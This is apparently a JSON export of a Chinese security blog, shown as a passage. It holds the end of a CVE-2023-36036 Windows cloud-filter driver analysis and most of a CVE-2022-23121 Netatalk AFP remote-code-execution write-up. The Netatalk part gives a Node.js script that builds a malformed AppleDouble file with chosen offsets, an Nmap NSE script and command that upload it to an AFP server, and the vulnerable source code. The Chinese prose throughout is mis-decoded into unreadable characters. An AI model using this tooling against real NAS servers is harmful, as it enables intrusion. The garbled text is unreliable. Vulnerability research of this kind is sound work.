fffff804`6f6a983b cldflt!HsmpRpCommitNoLock+0x13e3 09 fffffb8a`8a45f230 fffff804`6f66f0d7 cldflt!HsmiOpUpdatePlaceholderDirectory+0x57f 0a fffffb8a`8a45f320 fffff804`6f674b65 cldflt!HsmFltProcessUpdatePlaceholder+0x443 0b fffffb8a`8a45f3d0 fffff804`6f6a4504 cldflt!HsmFltProcessHSMControl+0x3d5 0c fffffb8a`8a45f500 fffff804`647264cc cldflt!HsmFltPreFILE_SYSTEM_CONTROL+0x6a4 0d fffffb8a`8a45f5a0 fffff804`64725f7a FLTMGR!FltpPerformPreCallbacksWorker+0x36c 0e fffffb8a`8a45f6c0 fffff804`64725021 FLTMGR!FltpPassThroughInternal+0xca 0f fffffb8a`8a45f710 fffff804`6475ae2f FLTMGR!FltpPassThrough+0x541 10 fffffb8a`8a45f7a0 fffff804`63410665 FLTMGR!FltpFsControl+0xbf 11 fffffb8a`8a45f800 fffff804`6380142c nt!IofCallDriver+0x55 12 fffffb8a`8a45f840 fffff804`63801081 nt!IopSynchronousServiceTail+0x34c 13 fffffb8a`8a45f8e0 fffff804`638d9ed6 nt!IopXxxControlFile+0xc71 14 fffffb8a`8a45fa20 fffff804`63610ef5 nt!NtFsControlFile+0x56 15 fffffb8a`8a45fa90 00007ff9`c648d704 nt!KiSystemServiceCopyEnd+0x25 16 00000056`01aff5b8 00007ff6`5e59167f ntdll!NtFsControlFile+0x14 17 00000056`01aff5c0 00000000`000001bc 0x00007ff6`5e59167f 18 00000056`01aff5c8 00000000`00000000 0x1bc PoCä¼šåœ¨è¿‡å‡ å¤©ä¸Šä¼ åˆ°GitHub\nhttps://github.com/Chestnuts4/POC å°ç»“ æœ¬æ¬¡æ¼æ´åˆ†æç¦»ä¸å¼€ä¸šå†…å‰è¾ˆé€†å‘å¾—å‡ºçš„_HSM_REPARSE_DATAç»“æ„ä½“ä¿¡æ¯ï¼Œè¿™ä¸ªç»“æ„ä½“å¾®è½¯æ²¡æœ‰å…¬å¼€çš„æ–‡æ¡£ï¼Œç›¸å…³èµ„æ–™ä¹Ÿå¾ˆå°‘ã€‚å¯ä»¥çœ‹åˆ°æ—©åœ¨2018å¹´ï¼Œå°±å·²ç»é€†å‘å‡ºäº†HSMç›¸å…³æ•°æ®ç»“æ„ä¿¡æ¯ã€‚ç›®å‰åªæœ‰è¿™ä¸€ä¸ªä»“åº“æœ‰ç›¸å…³ä¿¡æ¯ï¼Œå‘å‰è¾ˆè‡´æ•¬ã€‚\n/*****************************************************************************/ /* ReparseDataHsm.h Copyright (c) Ladislav Zezula 2018 */ /*---------------------------------------------------------------------------*/ /* Interface of the HSM reparse data structures */ /*---------------------------------------------------------------------------*/ /* Date Ver Who Comment */ /* -------- ---- --- ------- */ /* 06.09.18 1.00 Lad The first version of ReparseDataHsm.h */ /*****************************************************************************/ è¿™é‡Œå¼•ç”¨ä¸€ä¸‹å‰è¾ˆçš„ä¸»é¡µã€‚\nhttps://www.zezula.net/en/tools/main.html\næ•´ä½“æ¥çœ‹ï¼Œè¿™ä¸ªæ¼æ´åŸç†å’Œè§¦å‘æ–¹å¼è¾ƒä¸ºç®€å•ï¼Œåœ¨ä½¿ç”¨memcpyä¹‹å‰æ²¡æœ‰æ ¡éªŒé•¿åº¦ï¼Œè€Œä¿®å¤ä¹Ÿç®€å•ï¼Œå†è§£å‹ä¹‹å‰éªŒè¯é•¿åº¦æ˜¯å¦è¶…è¿‡0x4000ï¼Œè¶…è¿‡åˆ™è®¤ä¸ºæ•°æ®æœ‰é”™ï¼Œè¿›å…¥åˆ°é”™è¯¯é€»è¾‘ï¼Œä»è€Œåœ¨æºå¤´é˜»æ­¢äº†è§¦å‘æ¼æ´é€»è¾‘ã€‚\nåœ¨æ¼æ´ä¿®å¤å¤„åœ¨ä¿®å¤ä¸Šä¸ªæ•´æ•°ä¸‹æº¢çš„æ¼æ´æ—¶ï¼Œå¼€å‘äººå‘˜åªä¿®å¤å½“æ—¶çš„æ•´æ•°ä¸‹æº¢æ¼æ´ï¼Œæ²¡æœ‰å»è€ƒè™‘é•¿åº¦ä¼šä¸ä¼šè¿‡é•¿ï¼ŒæŸäº›ç¨‹åº¦æ¥è¯´è¿™ä¹Ÿæ˜¯å¼€å‘çš„ç²—å¿ƒå¤§æ„å¯¼è‡´äº†è¿™ä¸ªæ¼æ´ç•™åˆ°ç°åœ¨ã€‚\nåœ¨ç¼–å†™PoCå‚è€ƒäº†å…¶ä»–å®‰å…¨ç ”ç©¶å‘˜å·²æœ‰çš„åˆ†æã€‚\nè‡³äºExploitéƒ¨åˆ†è¿˜å¾—å†ç ”ç©¶ä¸€ä¸‹ã€‚\nå‚è€ƒé“¾æ¥\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36036\nhttps://zhuanlan.zhihu.com/p/392194464\nhttps://github.com/microsoft/Windows-classic-samples/tree/main/Samples/CloudMirror\nhttps://learn.microsoft.com/en-us/windows/win32/cfapi/cloud-filter-reference\nhttps://learn.microsoft.com/zh-cn/windows/win32/cfapi/cloud-files-functions\nhttps://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/\nCreated at 2023-11-24T15:49:32+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-23121-afp-rce/","title":"CVE-2022-23121 AFP RCE åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"Netatalkä»‹ç» Netatalk æ˜¯ä¸€ä¸ª Apple Filing Protocol (AFP) çš„å¼€æºå®ç°ã€‚å®ƒä¸º Unix é£æ ¼ç³»ç»Ÿæä¾›äº†ä¸ Macintosh æ–‡ä»¶å…±äº«çš„åŠŸèƒ½ã€‚å¤šæ¬¾NASäº§å“å‡æœ‰é›†æˆè¯¥åŠŸèƒ½ã€‚\næ¼æ´ç®€ä»‹ Netatalkåœ¨å¤„ç†FPOpenForkå‘½ä»¤çš„æ—¶å€™ï¼Œç”±äºæœªæ£€æŸ¥AppleDoubleæ–‡ä»¶å¤´ä¸­çš„åç§»æ˜¯å¦è¶…å‡ºèŒƒå›´ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æ§åˆ¶AppleDoubleæ–‡ä»¶çš„æŸäº›åç§»ï¼Œåœ¨å†…å­˜ä¸­è¿›è¡Œè¶Šç•Œè¯»å†™ï¼Œé€šè¿‡è¯¥æ¼æ´æ”»å‡»è€…å¯ä»¥ä»¥å¯åŠ¨Netatalkçš„ç”¨æˆ·æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤\nAppledoubleæ–‡ä»¶ Appledoubleæ–‡ä»¶æ ¼å¼æ–‡æ¡£å¯åœ¨ä¸‹é¢é“¾æ¥ä¸‹è½½ï¼ŒAppleDoubleæ–‡ä»¶æ˜¯macä¸Šä¸€ç§å­˜å‚¨æ•°æ®çš„æ ¼å¼ï¼ŒAppleDoubleæ–‡ä»¶å¯åˆ†ä¸ºæ–‡ä»¶å¤´å’Œæ•°æ®éƒ¨åˆ†ï¼Œæ–‡ä»¶å¤´æ ¼å¼å¦‚ä¸‹ï¼Œå¯¹äºæ¯ä¸ªEntryæ¥è¯´ï¼Œæ•°æ®åœ¨æ–‡ä»¶å†…çš„èŒƒå›´å¯è¡¨ç¤ºä¸ºï¼š[offset:offset+length]\nField Length Magic number 4 bytes Version number 4 bytes Filler 16 bytes Number of entries 2 bytes Entry descriptor for each entry: Entry ID 4 bytes Offset 4 bytes Length 4 bytes ä»¥ä¸‹æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„Appledoubleæ–‡ä»¶ï¼ŒåŒ…å«ä¸¤ä¸ªentry\nentry 1\nentry IDï¼š0x09 offsetï¼š0x32 lengthï¼š0x71 entry 2\nentry IDï¼š0x02 offsetï¼š0xA3 lengthï¼š0x46 https://web.archive.org/web/20180311140826if_/http://kaiser-edv.de/documents/AppleSingle_AppleDouble.pdf\nå¦‚ä½•ç”Ÿæˆæœ‰æ•ˆçš„AppleDoubleæ–‡ä»¶è§¦å‘æ¼æ´ åœ¨\rhttps://nosec.org/home/detail/4997.html ä¸­keeeeå¸ˆå‚…åˆ†äº«äº†å¦‚ä½•é€šè¿‡xattråº“ç”Ÿæˆappledoubleæ–‡ä»¶ï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿ç”Ÿæˆæ‰€éœ€æ–‡ä»¶å¯¹keeeeå¸ˆå‚…çš„æ–¹æ³•è¿›è¡Œé­”æ”¹ã€‚\né¦–å…ˆå®‰è£… xattr-fileå’Œminimiståº“ï¼š\nnpm install xattr-file npm install minimist åœ¨node_modulesç›®å½•å†…æ‰¾åˆ°xattr-file.jsæ–‡ä»¶ï¼Œä¿®æ”¹creatæ–¹æ³•ï¼Œä¸ºå…¶æ·»åŠ æ¥å—å„ç§åç§»çš„æ¥å£ï¼Œå¤§è‡´å¦‚ä¸‹ï¼š\nfunction create(attrs, resoLength, findoff, findlen, forkoff, forklen) { ...... var finderInfoOffset = findoff == -1 ? applLength : findoff var finderInfoLength = findlen == -1 ? (attrLength + keysLength + dataLength) : findlen var resourceForkOffset = forkoff == -1 ? fileLength : forkoff var resourceForkLength = forklen == -1 ? resoLength : forklen ç”Ÿæˆxattræ–‡ä»¶çš„nodejsè„šæœ¬ï¼š\nvar xattr = require(\u0026#34;xattr-file\u0026#34;); const args = require(\u0026#39;minimist\u0026#39;)(process.argv.slice(2)) const fs = require(\u0026#39;fs\u0026#39;) var fp = \u0026#39;./\u0026#39; var origname = \u0026#39;read\u0026#39; // resource fork data éƒ¨åˆ†ï¼š var buffer2 = Buffer.from(\u0026#34;a\u0026#34;.repeat(0x12)) var buffer3 = Buffer.from(\u0026#34;a\u0026#34;.repeat(0x34)) console.log(Buffer.concat([ buffer2, buffer3]).length) // æ‰“å°çš„ resource fork data é•¿åº¦ã€‚ resoLength = Buffer.concat([buffer2, buffer3]).length var findoff = args[\u0026#39;findoff\u0026#39;] == undefined ? -1 : parseInt(args[\u0026#39;findoff\u0026#39;]) var findlen = args[\u0026#39;findlen\u0026#39;] == undefined ? -1 : parseInt(args[\u0026#39;findlen\u0026#39;]) var forklen = args[\u0026#39;forklen\u0026#39;] == undefined ? -1 : parseInt(args[\u0026#39;forklen\u0026#39;]) var forkoff = args[\u0026#39;forkoff\u0026#39;] == undefined ? -1 : parseInt(args[\u0026#39;forkoff\u0026#39;]) // å¦‚æœnameä¸ºç©ºåˆ™ä¸ºread var name = args[\u0026#34;name\u0026#34;] == undefined ? origname : args[\u0026#34;name\u0026#34;] console.log(\u0026#39;findoff:\u0026#39; + findoff + \u0026#34; findlen:\u0026#34; + findlen + \u0026#34; forkoff:\u0026#34; + forkoff + \u0026#34; forklen:\u0026#34; + forklen) var buffer = xattr.create({ \u0026#34;com.example.Attribute\u0026#34;: \u0026#34;my data\u0026#34; }, resoLength, findoff, findlen, forkoff, forklen); var buffer4 = Buffer.concat([buffer, buffer2, buffer3]) fs.writeFile(fp + \u0026#39;._\u0026#39; + name, buffer4, { mode: 0o777 }, err =\u0026gt; { if (err) { console.error(err) return } else { console.log(\u0026#34;success write file, file path: \u0026#34; + fp + \u0026#39;._\u0026#39; + name) } //æ–‡ä»¶å†™å…¥æˆåŠŸã€‚ } ) fs.writeFile(fp + name, \u0026#34;hello world\u0026#34;, { mode: 0o777 }, err =\u0026gt; { if (err) { console.error(err) return } else { console.log(\u0026#34;success write file, file path: \u0026#34; + fp + name) } //æ–‡ä»¶å†™å…¥æˆåŠŸã€‚ } ) fs.chmod(fp+ name, 0o777, () =\u0026gt; { console.log(\u0026#34;change \u0026#34; + fp+ name + \u0026#34; mode\u0026#34;) }) fs.chmod(fp + \u0026#39;._\u0026#39; + name, 0o777, () =\u0026gt; { console.log(\u0026#34;change \u0026#34; + fp + \u0026#39;._\u0026#39; + name + \u0026#34; mode\u0026#34;) }) å¦‚ä½•å°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨\nç”Ÿæˆæ–‡ä»¶åï¼Œä¸ºäº†æ›´è´´åˆå®é™…æ¼æ´åˆ©ç”¨åœºæ™¯ï¼Œå³ç”Ÿæˆæœ‰æ•ˆAppleDoubleæ–‡ä»¶åé€šè¿‡AFPå®¢æˆ·ç«¯ä¸Šä¼ åˆ°AFPæœåŠ¡å™¨ï¼Œè¿™é‡Œå€Ÿé‰´Nmapè‡ªå¸¦çš„afpçš„luaåº“ï¼Œç¼–å†™æˆ‘ä»¬è‡ªå·±çš„ä¸Šä¼ NSEè„šæœ¬ã€‚\nåœ¨Nmapä¸­åŸç”ŸåŒ…å«äº†afp-lsçš„NSEè„šæœ¬ï¼Œå…¶å¼•ç”¨çš„luaåº“afp.luaå†…å«æœ‰æˆ‘ä»¬é€šè¿‡AFPåè®®ä¸Šä¼ æ–‡ä»¶éœ€è¦çš„æ¥å£WriteFileï¼Œåœ¨ä¸Šä¼ æ–‡ä»¶çš„NSEè„šæœ¬ä¸­è°ƒç”¨è¯¥æ¥å£å³å¯\nåœ¨scriptsç›®å½•ä¸‹æ–°å»ºafp-upfile.nseæ–‡ä»¶ï¼Œå°†afp-ls.nseå†…å®¹ç²˜è´´è¿›å»ï¼Œå»æ‰åˆ—å‡ºæ–‡ä»¶é€»è¾‘çš„ä»£ç ï¼Œä¹‹åç¼–å†™luaä»£ç ï¼Œè¯»å–æ–‡ä»¶ï¼Œå°†æ–‡ä»¶å†…å®¹ä¼ ç»™afp.luaå†…çš„WriteFileå‡½æ•°å³å¯ï¼Œæœ€ç»ˆå¦‚ä¸‹ï¼š\n...... action = function(host, port) -- è¿™é‡Œå’Œafp-lsçš„é€»è¾‘ä¸€æ · local msg local uploadpath = args[\u0026#34;uploadpath\u0026#34;] local filepath = args[\u0026#34;filepath\u0026#34;] local poc = io.open(filepath,\u0026#34;r\u0026#34;) local data = poc:read(\u0026#34;*all\u0026#34;) poc:close() status, msg = afpHelper:WriteFile(uploadpath, data) status, response = afpHelper:Logout() status, response = afpHelper:CloseSession() return data end return end åˆ©ç”¨è¯¥è„šæœ¬ï¼Œå¯ä»¥é€šè¿‡nmapä¸Šä¼ æ–‡ä»¶åˆ°afpæœåŠ¡å™¨\nnmap -p 548 --script=afp-upfile --script-args \u0026#34;uploadpath=test/._cmd,filepath=./._cmd\u0026#34; ip æ¼æ´æˆå›  libatalk/adouble/ad_open.c#parse_entries å‡½æ•°ä¸ºNettatalkè§£æbufå†…çš„æ•°æ®åˆ°è‡ªå®šä¹‰çš„ç»“æ„ä½“ï¼Œé€šè¿‡è¯»å–bufå†…å¯¹åº”offsetçš„æ•°æ®åˆ°ä¼ å…¥çš„adæŒ‡é’ˆæŒ‡å‘çš„adoubleç»“æ„ä½“çš„æŸäº›æˆå‘˜å†…ï¼Œå®Œæˆå¯¹ç›¸åº”å€¼çš„è®¾ç½®ï¼Œå…¶ä¸­bufæ•°æ®æ¥è‡ªè¯»å–çš„._filenameçš„æ–‡ä»¶ã€‚åœ¨å¾ªç¯ä¸­å°†bufé¦–åœ°å€åŠ ä¸ŠæŸä¸ªoffsetä¸­çš„æ•°æ®é€šè¿‡memcpyå‡½æ•°æ‹·è´åˆ°adæŒ‡å‘çš„adoubleç»“æ„ä½“å˜é‡å†…ï¼Œåœ¨å¾ªç¯å†…å«æœ‰ä¸€ä¸ªifåˆ¤æ–­ï¼Œå½“å¤„äºä»¥ä¸‹æƒ…å†µæ—¶ï¼Œparse_entries ä¼šè¿”å›-1å¹¶ä¸”æ‰“å°è­¦å‘Šæ—¥å¿—\neid \u0026gt; ADEID_MAXï¼ŒADEID_MAX=20 off\u0026gt;sizeof(ad-\u0026gt;ad_data) eidä¸ç­‰äº2å¹¶ä¸”æ­¤æ—¶çš„entryçš„åç§»å’Œæ•°æ®é•¿åº¦ç›¸åŠ å¤§äº1024 å³é€šè¿‡æ§åˆ¶æ–‡ä»¶å†…çš„æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶adoubleç»“æ„ä½“å†…çš„entryçš„off+lenä½¿å¾—entry.off+entry.len+bufè¶…è¿‡bufçš„è¾¹ç•Œï¼Œæ­£å¸¸æµç¨‹ä¸­adoubleç»“æ„ä½“å†…çš„entryçš„off+len+bufä¸åº”è¯¥è¶Šè¿‡bufè¾¹ç•Œã€‚\nstatic int parse_entries(struct adouble *ad, char *buf, uint16_t nentries) { uint32_t eid, len, off; int ret = 0; /* now, read in the entry bits */ for (; nentries \u0026gt; 0; nentries-- ) { memcpy(\u0026amp;eid, buf, sizeof( eid )); eid = get_eid(ntohl(eid)); buf += sizeof( eid ); memcpy(\u0026amp;off, buf, sizeof( off )); off = ntohl( off ); buf += sizeof( off ); memcpy(\u0026amp;len, buf, sizeof( len )); len = ntohl( len ); buf += sizeof( len ); ad-\u0026gt;ad_eid[eid].ade_off = off; ad-\u0026gt;ad_eid[eid].ade_len = len; if (!eid || eid \u0026gt; ADEID_MAX || off \u0026gt;= sizeof(ad-\u0026gt;ad_data) || ((eid != ADEID_RFORK) \u0026amp;\u0026amp; (off + len \u0026gt; sizeof(ad-\u0026gt;ad_data)))) // ADEID_RFORK { ret = -1; LOG(log_warning, logtype_ad, \u0026#34;parse_entries: bogus eid: %u, off: %u, len: %u\u0026#34;, (uint)eid, (uint)off, (uint)len); } } return ret; } // adouble å®šä¹‰ struct adouble { ...... char ad_data[AD_DATASZ_MAX]; //AD_DATASZ_MAX = 1024 }; åœ¨ä»£ç é‡Œï¼Œåœ¨ä»¥ä¸‹å‡ å¤„å‡½æ•°ä¸­æœ‰è°ƒç”¨parse_entries å‡½æ•°\nad_header_read ad_header_read_osx ad_header_read_ea åœ¨ä¸‰å¤„å‡½æ•°ä¸­ï¼Œåªæœ‰libatalk/adouble/ad_open.c#ad_header_read_osxå‡½æ•°è°ƒç”¨parse_entrieså‡½æ•°æ—¶ï¼Œå³ä½¿parse_entriesè¿”å›-1ï¼Œè¯¥å‡½æ•°ä¸ä¼šreturnä¹Ÿä¸ä¼šè¿›å…¥å¼‚å¸¸å¤„ç†æµç¨‹ï¼Œä»…ä»…æ˜¯é€šè¿‡æ—¥å¿—è®°å½•ï¼Œç»§ç»­æ‰§è¡Œè€Œä¸æŠ¥é”™ã€‚\nif (parse_entries(\u0026amp;adosx, buf, nentries) != 0) { LOG(log_warning, logtype_ad, \u0026#34;ad_header_read(%s): malformed AppleDouble\u0026#34;, path ? fullpathname(path) : \u0026#34;\u0026#34;); } ä¹‹åad_header_read_osx ä¼šè¯»å–adoubleç»“æ„ä½“å†…çš„åç§»ï¼Œåˆ¤æ–­finderinfoçš„entry lenæ˜¯å¦ç­‰äº32ï¼Œä¸ç­‰äºåˆ™è¿›å…¥ifå†…ï¼Œå¹¶è°ƒç”¨libatalk/adouble/ad_open.c#ad_convert_osx å‡½æ•°\nåœ¨ad_convert_osx å‡½æ•°ä¸­ä¼šè¯»å–adæŒ‡é’ˆæŒ‡å‘çš„adoubleç»“æ„ä½“å†…çš„entryç»“æ„çš„offå’Œlenåç§»å¹¶è°ƒç”¨memmoveå‡½æ•°è¿›è¡Œå†…å­˜å¤åˆ¶ï¼Œæ­¤åç§»æ°å¥½æ˜¯parse_entries å‡½æ•°ä»æ–‡ä»¶è¯»å–å¹¶èµ‹å€¼çš„åç§»ã€‚\nstatic int ad_convert_osx(const char *path, struct adouble *ad) { ...... origlen = ad_getentryoff(ad, ADEID_RFORK) + ad_getentrylen(ad, ADEID_RFORK); map = mmap(NULL, origlen, PROT_READ | PROT_WRITE, MAP_SHARED, ad_reso_fileno(ad), 0); if (map == MAP_FAILED) { LOG(log_error, logtype_ad, \u0026#34;mmap AppleDouble: %s\\n\u0026#34;, strerror(errno)); EC_FAIL; } memmove(map + ad_getentryoff(ad, ADEID_FINDERI) + ADEDLEN_FINDERI, map + ad_getentryoff(ad, ADEID_RFORK), ad_getentrylen(ad, ADEID_RFORK)); (void)ad_rebuild_adouble_header_osx(ad, map); munmap(map, origlen); åˆ†æå‡½æ•°è°ƒç”¨é“¾ é€šè¿‡\rdoxygen+graphvizç»˜åˆ¶å‡½æ•°è°ƒç”¨é“¾å›¾ï¼Œä»å›¾ä¸­å¯ä»¥çœ‹å‡ºå®Œæ•´çš„å‡½æ•°è°ƒç”¨é“¾ä¸ºï¼šad_openâ†’ad_open_rfâ†’ad_open_rf_eaâ†’ad_header_read_osxâ†’parse_entries\nè€Œad_openå‡½æ•°æ‰€åœ¨çš„libatalkç›®å½•å†…çš„ä»£ç ä¼šè¢«ç¼–è¯‘ä¸ºlibatalk.soï¼Œæœ€ç»ˆè¢«afpdæœåŠ¡ä½¿ç”¨ï¼Œåœ¨afpd ä»£ç ä¸­ï¼Œç”±etc/afpd/fork.c#afp_openfork è°ƒç”¨libatalk/adouble/ad_open.c#ad_openå‡½æ•°ã€‚\nint afp_openfork(AFPObj *obj _U_, char *ibuf, size_t ibuflen _U_, char *rbuf, size_t *rbuflen) { ..... /* First ad_open(), opens data or ressource fork */ if (ad_open(ofork-\u0026gt;of_ad, upath, adflags, 0666) \u0026lt; 0) { ..... åœ¨libatalk/adouble/ad_open.c#ad_open å‡½æ•°ä¸­ï¼Œå½“è¯·æ±‚å†…è®¾ç½®äº†ADFLAGS_RFè¿™ä¸ªflagæ‰ä¼šè°ƒç”¨ad_open_rfå‡½æ•°\nif (adflags \u0026amp; ADFLAGS_RF) { // ADFLAGS_RF = 1\u0026lt;\u0026lt;1 = 2 if (ad_open_rf(path, adflags, mode, ad) != 0) { EC_FAIL; } } è§¦å‘æ¼æ´æµç¨‹ æƒ³è¦è§¦å‘è¯¥æ¼æ´ï¼Œå¿…é¡»è¦äº†è§£åˆ°afpdæœåŠ¡å¦‚ä½•å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼Œä»¥ä¾¿æ„é€ è¯·æ±‚æ‰§è¡Œåˆ°æ¼æ´ä»£ç å¤„ã€‚\nå¯åŠ¨Netatalkçš„æœåŠ¡ç«¯afpdæœåŠ¡åï¼Œåœ¨afpdçš„mainå‡½æ•°å…¥å£å¤„åˆå§‹åŒ–ä¸€äº›å˜é‡ã€åŠ è½½AFPé…ç½®ã€ç›‘å¬ç«¯å£ç­‰ã€‚\nint main(int ac, char **av) { struct sigaction\tsv; sigset_t sigs; int ret; ...... if (afp_config_parse(\u0026amp;obj, \u0026#34;afpd\u0026#34;) != 0) ..... obj.options.save_mask = umask(obj.options.umask); ...... while (1) { ....... for (int i = 0; i \u0026lt; asev-\u0026gt;used; i++) { if (asev-\u0026gt;fdset[i].revents \u0026amp; (POLLIN | POLLERR | POLLHUP | POLLNVAL)) { switch (asev-\u0026gt;data[i].fdtype) { case LISTEN_FD: if ((child = dsi_start(\u0026amp;obj, (DSI *)(asev-\u0026gt;data[i].private), server_children))) { if (!(asev_add_fd(asev, child-\u0026gt;afpch_ipc_fd, IPC_FD, child))) { ..... kill(child-\u0026gt;afpch_pid, SIGKILL); } } break; ...... } ä¹‹åè¿›å…¥whileå¾ªç¯ï¼Œè°ƒç”¨ etc/afpd/main.c#dsi_startï¼Œdsi_start è°ƒç”¨dsi_getsession ï¼Œåœ¨dsi_getsessionä¸­è°ƒç”¨dsi-\u0026gt;proto_open å‡½æ•°æŒ‡é’ˆï¼Œå®é™…æŒ‡å‘libatalk/dsi/dsi_tcp.c#dsi_tcp_open\nstatic afp_child_t *dsi_start(AFPObj *obj, DSI *dsi, server_child_t *server_children) { afp_child_t *child = NULL; if (dsi_getsession(dsi, server_children, obj-\u0026gt;options.tickleval, \u0026amp;child) != 0) { ...... } /* we\u0026#39;ve forked. */ if (child == NULL) { configfree(obj, dsi); afp_over_dsi(obj); /* start a session */ exit (0); } return child; } int dsi_getsession(DSI *dsi, server_child_t *serv_children, int tickleval, afp_child_t **childp) { // è®¾ç½®ã€åˆå§‹åŒ–å˜é‡ç­‰æ“ä½œï¼Œé€šè¿‡forkå‡½æ•°åˆ›å»ºå­è¿›ç¨‹ switch (pid = dsi-\u0026gt;proto_open(dsi)) { /* in libatalk/dsi/dsi_tcp.c */ ...... } dsi_tcp_openå‡½æ•°æ¥æ”¶æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥ï¼Œé€šè¿‡forkå‡½æ•°åˆ›å»ºå­è¿›ç¨‹\nstatic pid_t dsi_tcp_open(DSI *dsi) { pid_t pid; SOCKLEN_T len; len = sizeof(dsi-\u0026gt;client); dsi-\u0026gt;socket = accept(dsi-\u0026gt;serversock, (struct sockaddr *) \u0026amp;dsi-\u0026gt;client, \u0026amp;len); ...... if (0 == (pid = fork()) ) { /* child */ ...... } /* send back our pid */ return pid; } è¿”å›åˆ°dsi_getsessionå‡½æ•°ä¸­ï¼Œå½“forkè¿”å›çš„pidä¸º0æ—¶ï¼Œå³å½“å‰è¿›ç¨‹ä¸ºå­è¿›ç¨‹åˆ™è·³å‡ºswitchç»“æ„ï¼Œè¿›å…¥å¤„ç†DSIæ•°æ®çš„é€»è¾‘ï¼Œå½“è¿”å›çš„pidä¸ä¸º0ä¹Ÿä¸ä¸º-1æ—¶ï¼Œå³å½“å‰è¿›ç¨‹ä¸ºçˆ¶è¿›ç¨‹ï¼Œåˆ™è¿”å›åˆ°dsi_startå‡½æ•°ã€‚\nint dsi_getsession(DSI *dsi, server_child_t *serv_children, int tickleval, afp_child_t **childp) { // è®¾ç½®ã€åˆå§‹åŒ–å˜é‡ç­‰æ“ä½œ switch (pid = dsi-\u0026gt;proto_open(dsi)) { /* in libatalk/dsi/dsi_tcp.c */ case -1: ...... case 0: // å¦‚æœæ˜¯å­è¿›ç¨‹åˆ™ç›´æ¥é€€å‡ºswitchï¼Œè¿›å…¥å¤„ç†DSIæ•°æ®çš„é€»è¾‘ break; default: //å¦‚æœæ˜¯çˆ¶è¿›ç¨‹åˆ™è¿”å›åˆ°dsi_startå‡½æ•° ...... dsi-\u0026gt;proto_close(dsi); *childp = child; return 0; } .... switch (dsi-\u0026gt;header.dsi_command) { // æ ¹æ®dsiå‘½ä»¤æ‰§è¡Œä¸åŒåŠ¨ä½œ case DSIFUNC_STAT: /* send off status and return */ ..... case DSIFUNC_OPEN: /* setup session */ /* set up the tickle timer */ dsi-\u0026gt;timer.it_interval.tv_sec = dsi-\u0026gt;timer.it_value.tv_sec = tickleval; dsi-\u0026gt;timer.it_interval.tv_usec = dsi-\u0026gt;timer.it_value.tv_usec = 0; dsi_opensession(dsi); *childp = NULL; return 0; default: /* just close */ LOG(log_info, logtype_dsi, \u0026#34;DSIUnknown %d\u0026#34;, dsi-\u0026gt;header.dsi_command); dsi-\u0026gt;proto_close(dsi); exit(EXITERR_CLNT); } } ä¹‹åå›åˆ°dsi_startå‡½æ•°ä¸­ï¼Œå¦‚æœå½“å‰è¿›ç¨‹ä¸ºçˆ¶è¿›ç¨‹åˆ™è¿”å›åˆ°mainå‡½æ•°ä¸­çš„whileå¾ªç¯ä¸­ï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ã€‚å¦‚æœå½“å‰è¿›ç¨‹ä¸ºå­è¿›ç¨‹åˆ™è°ƒç”¨afp_over_dsiå‡½æ•°å¤„ç†AFPæ•°æ®ï¼Œæ ¹æ®ä¸åŒçš„AFPå‘½ä»¤è°ƒç”¨å…¨å±€å˜é‡afp_switch[]å†…çš„ä¸åŒå‡½æ•°æŒ‡é’ˆè¿›è¡Œå¤„ç†\nvoid afp_over_dsi(AFPObj *obj) { ...... /* get stuck here until the end */ while (1) { ...... cmd = dsi_stream_receive(dsi); ...... switch(cmd) { case DSIFUNC_CLOSE: ...... case DSIFUNC_TICKLE: ...... case DSIFUNC_CMD: ...... function = (u_char) dsi-\u0026gt;commands[0]; /* send off an afp command. in a couple cases, we take advantage * of the fact that we\u0026#39;re a stream-based protocol. */ if (afp_switch[function]) { dsi-\u0026gt;datalen = DSI_DATASIZ; dsi-\u0026gt;flags |= DSI_RUNNING; LOG(log_debug, logtype_afpd, \u0026#34;\u0026lt;== Start AFP command: %s\u0026#34;, AfpNum2name(function)); AFP_AFPFUNC_START(function, (char *)AfpNum2name(function)); err = (*afp_switch[function])(obj, (char *)dsi-\u0026gt;commands, dsi-\u0026gt;cmdlen, (char *)\u0026amp;dsi-\u0026gt;data, \u0026amp;dsi-\u0026gt;datalen); ...... } /* error */ afp_dsi_die(EXITERR_CLNT); } afp_switchè¢«preauth_switchåˆå§‹åŒ–ï¼Œé‡Œé¢åªæœ‰å°‘é‡å‡½æ•°æŒ‡é’ˆï¼Œè€Œåœ¨postauth_switchä¸­å«æœ‰å¤§é‡å‡½æ•°æŒ‡é’ˆï¼Œæ¨æµ‹ä¸ºç»è¿‡èº«ä»½éªŒè¯åafp_switchè¢«postauth_switchèµ‹å€¼\nstatic AFPCmd preauth_switch[] = { NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,\t/* 0 - 7 */ NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,\t/* 8 - 15 */ NULL, NULL, afp_login, afp_logincont, afp_logout, NULL, NULL, NULL,\t/* 16 - 23 */ ..... }; AFPCmd *afp_switch = preauth_switch; AFPCmd postauth_switch[] = { NULL, afp_bytelock, afp_closevol, afp_closedir, afp_closefork, afp_copyfile, afp_createdir, afp_createfile,\t/* 0 - 7 */ afp_delete, afp_enumerate, afp_flush, afp_flushfork, afp_null, afp_null, afp_getforkparams, afp_getsrvrinfo,\t/* 8 - 15 */ afp_getsrvrparms, afp_getvolparams, afp_login, afp_logincont, afp_logout, afp_mapid, afp_mapname, afp_moveandrename,\t/* 16 - 23 */ afp_openvol, afp_opendir, afp_openfork, afp_read, afp_rename, afp_setdirparams, afp_setfilparams, afp_setforkparams, /* 24 - 31 */ afp_setvolparams, afp_write, afp_getfildirparams, afp_setfildirparams, afp_changepw, afp_getuserinfo, 